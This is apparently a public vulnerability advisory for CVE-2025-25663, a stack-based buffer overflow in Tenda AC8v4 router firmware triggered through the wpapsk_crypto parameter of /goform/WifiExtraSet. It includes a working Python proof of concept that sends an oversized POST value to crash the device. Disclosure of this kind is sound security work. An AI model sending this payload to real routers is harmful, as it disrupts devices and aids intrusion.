# CVE-2025-25663

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/103518

## Affected version

AC8v4 V16.03.34.06

## Vulnerability details

In the Tenda AC8v4 **V16.03.34.06** has a stack overflow vulnerability located in the `sub_46AC38` function. This function accepts the `wpapsk_crypto` parameter from a POST request by variable `wpapsk_crypto`.However, since the user has control over the input of `wpapsk_crypto`, the statement `strcpy(v21, src);` leads to a buffer overflow. The user-supplied `wpapsk_crypto` can exceed the capacity of the  `v21`  array, thus triggering this security vulnerability.

![img](https://s2.loli.net/2025/02/15/3fDEQdknCrHPbUp.png)

A vulnerability, which was classified as critical, was found in  Tenda AC8v4 **V16.03.34.06**. Affected is the function SUB_0046AC38 of the file /goform/WifiExtraSet. The manipulation of the argument wpapsk_crypto leads to stack-based buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

## PoC

```python
import requests

url = "http://192.168.2.1/goform/WifiExtraSet"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}

data = {
    "wifi_chkHz": "0",
    "wl_mode": "a24l",
    "mac": "111",  
    "handset": "0",
    "wpapsk_crypto": "s"*600,  
    "wpapsk_key": "bXF"  
}

response = requests.post(url, headers=headers, data=data)

print(response.status_code)
print(response.text)
```

![img](https://s2.loli.net/2025/02/15/spbiUO1xCPSf6yv.png)

## Discoverer

The vulnerability was discovered by Professor Wei Zhou's team (IoTS&P Lab) from the School of Cyber Science and Engineering at Huazhong University of Science and Technology.